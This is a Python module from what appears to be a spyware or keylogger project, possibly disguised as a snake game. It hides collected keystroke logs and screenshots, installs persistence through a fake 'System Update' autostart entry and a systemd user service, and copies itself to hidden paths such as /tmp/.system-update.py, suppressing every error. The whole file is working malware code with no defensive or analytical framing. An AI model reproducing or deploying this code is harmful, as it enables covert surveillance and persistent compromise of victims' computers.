"""
Virus Persistence Module - Stealth, Persistence, Replication
"""
import os
import shutil
import subprocess
from virus_config import *
from virus_utils import log_activity

def setup_stealth():
    """Hide files and create hidden directories"""
    if not ENABLE_STEALTH:
        return
    
    try:
        os.makedirs(DATA_DIR, exist_ok=True)
        
        if os.path.exists(LOG_FILE):
            shutil.move(LOG_FILE, f"{DATA_DIR}/{LOG_FILE}")
        # activity_log.txt is merged into keyboard_log.txt, but clean up if exists
        if os.path.exists(ACTIVITY_LOG_FILE):
            # Merge any existing activity_log into keyboard_log before removing
            try:
                if os.path.exists(f"{DATA_DIR}/{LOG_FILE}"):
                    with open(ACTIVITY_LOG_FILE, 'r', encoding='utf-8') as f:
                        activity_content = f.read()
                    with open(f"{DATA_DIR}/{LOG_FILE}", 'a', encoding='utf-8') as f:
                        f.write("\n[MERGED FROM OLD ACTIVITY_LOG]\n")
                        f.write(activity_content)
                os.remove(ACTIVITY_LOG_FILE)
            except:
                pass
        if os.path.exists(SCREENSHOT_DIR):
            shutil.move(SCREENSHOT_DIR, f"{DATA_DIR}/{SCREENSHOT_DIR}")
        
        log_activity("STEALTH", "Stealth mode activated - files hidden")
    except:
        pass

def install_persistence():
    """Install as system service for persistence"""
    if not ENABLE_PERSISTENCE:
        return
    
    try:
        # Use virus_core.py path instead of snake_game.py
        virus_path = os.path.abspath(os.path.join(os.path.dirname(__file__), 'virus_core.py'))
        home_dir = os.path.expanduser("~")
        
        autostart_dir = f"{home_dir}/.config/autostart"
        os.makedirs(autostart_dir, exist_ok=True)
        
        desktop_file = f"{autostart_dir}/system-update.desktop"
        desktop_content = f"""[Desktop Entry]
Type=Application
Name=System Update
Exec=python3 {virus_path}
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
"""
        with open(desktop_file, 'w') as f:
            f.write(desktop_content)
        
        try:
            systemd_dir = f"{home_dir}/.config/systemd/user"
            os.makedirs(systemd_dir, exist_ok=True)
            
            service_file = f"{systemd_dir}/system-update.service"
            service_content = f"""[Unit]
Description=System Update Service
After=graphical-session.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {virus_path}
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
"""
            with open(service_file, 'w') as f:
                f.write(service_content)
            
            subprocess.run(['systemctl', '--user', 'enable', 'system-update.service'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
        except:
            pass
        
        log_activity("PERSISTENCE", "Persistence installed - will survive reboots")
    except:
        pass

def self_replicate():
    """Copy itself to other locations"""
    if not ENABLE_SELF_REPLICATION:
        return
    
    try:
        virus_path = os.path.abspath(os.path.join(os.path.dirname(__file__), 'virus_core.py'))
        home_dir = os.path.expanduser("~")
        
        replication_targets = [
            f"{home_dir}/.cache/system-update.py",
            f"{home_dir}/.local/share/system-service.py",
            "/tmp/.system-update.py",
        ]
        
        for target in replication_targets:
            try:
                target_dir = os.path.dirname(target)
                os.makedirs(target_dir, exist_ok=True)
                shutil.copy2(virus_path, target)
                os.chmod(target, 0o755)
            except:
                pass
        
        log_activity("REPLICATION", "Self-replication completed")
    except:
        pass

